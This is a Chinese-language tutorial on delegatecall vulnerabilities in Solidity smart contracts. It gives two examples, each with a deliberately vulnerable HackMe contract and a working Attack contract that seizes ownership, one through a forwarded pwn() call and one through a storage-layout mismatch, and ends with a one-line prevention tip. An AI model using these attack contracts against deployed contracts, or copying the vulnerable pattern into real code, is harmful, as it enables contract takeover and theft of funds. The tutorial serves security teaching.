# delegatecall 漏洞

## 漏洞

delegatecall 的使用比较复杂，错误使用或错误理解可能导致灾难性的结果。

使用 delegatecall 时，你必须记住两点：

1. delegatecall 保留上下文（存储、调用者等...）
2. 进行 delegatecall 的合约和被调用的合约必须有相同的存储布局

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*
HackMe 是一个使用 delegatecall 执行代码的合约。
虽然 HackMe 中没有函数可以改变其所有者，但攻击者可以通过利用 delegatecall 劫持合约。让我们看看如何做到这一点。

1. Alice 部署 Lib
2. Alice 使用 Lib 的地址部署 HackMe
3. Eve 使用 HackMe 的地址部署 Attack
4. Eve 调用 Attack.attack()
5. HackMe 的所有者变成了 Attack

发生了什么？
Eve 调用了 Attack.attack()。
Attack 调用了 HackMe 的回退函数并发送了 pwn() 函数选择器。HackMe 使用 delegatecall 将调用转发给 Lib。
此处 msg.data 包含 pwn() 函数选择器。
这告诉 Solidity 在 Lib 内调用 pwn() 函数。
pwn() 函数将所有者更新为 msg.sender。
delegatecall 使用 HackMe 的上下文运行 Lib 的代码。
因此，HackMe 的存储被更新为 msg.sender，此时 msg.sender 是 HackMe 的调用者，即 Attack。
*/

contract Lib {
    address public owner;

    function pwn() public {
        owner = msg.sender;
    }
}

contract HackMe {
    address public owner;
    Lib public lib;

    constructor(Lib _lib) {
        owner = msg.sender;
        lib = Lib(_lib);
    }

    fallback() external payable {
        address(lib).delegatecall(msg.data);
    }
}

contract Attack {
    address public hackMe;

    constructor(address _hackMe) {
        hackMe = _hackMe;
    }

    function attack() public {
        hackMe.call(abi.encodeWithSignature("pwn()"));
    }
}

```

这是另一个例子。

在理解这个漏洞之前，你需要了解 Solidity 如何存储状态变量。

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*
这是前一个漏洞的更复杂版本。

1. Alice 部署 Lib 和 HackMe（使用 Lib 的地址）
2. Eve 使用 HackMe 的地址部署 Attack
3. Eve 调用 Attack.attack()
4. HackMe 的所有者变成了 Attack

发生了什么？
注意 Lib 和 HackMe 中的状态变量定义方式不同。这样调用 Lib.doSomething() 会改变 HackMe 内第一个状态变量，即 lib 的地址。

在 attack() 内，第一次调用 doSomething() 改变了 HackMe 中存储的 lib 地址。
现在 lib 的地址被设置为 Attack。
第二次调用 doSomething() 调用的是 Attack.doSomething()，我们在此处改变所有者。
*/

contract Lib {
    uint256 public someNumber;

    function doSomething(uint256 _num) public {
        someNumber = _num;
    }
}

contract HackMe {
    address public lib;
    address public owner;
    uint256 public someNumber;

    constructor(address _lib) {
        lib = _lib;
        owner = msg.sender;
    }

    function doSomething(uint256 _num) public {
        lib.delegatecall(abi.encodeWithSignature("doSomething(uint256)", _num));
    }
}

contract Attack {
    // 确保存储布局与 HackMe 相同
    // 这将允许我们正确更新状态变量
    address public lib;
    address public owner;
    uint256 public someNumber;

    HackMe public hackMe;

    constructor(HackMe _hackMe) {
        hackMe = HackMe(_hackMe);
    }

    function attack() public {
        // 覆盖 lib 的地址
        hackMe.doSomething(uint256(uint160(address(this))));
        // 传递任意数字作为输入，下面的 doSomething() 函数将被调用
        hackMe.doSomething(1);
    }

    // 函数签名必须与 HackMe.doSomething() 匹配
    function doSomething(uint256 _num) public {
        owner = msg.sender;
    }
}
```

## 预防技术

使用无状态库 (stateless Library)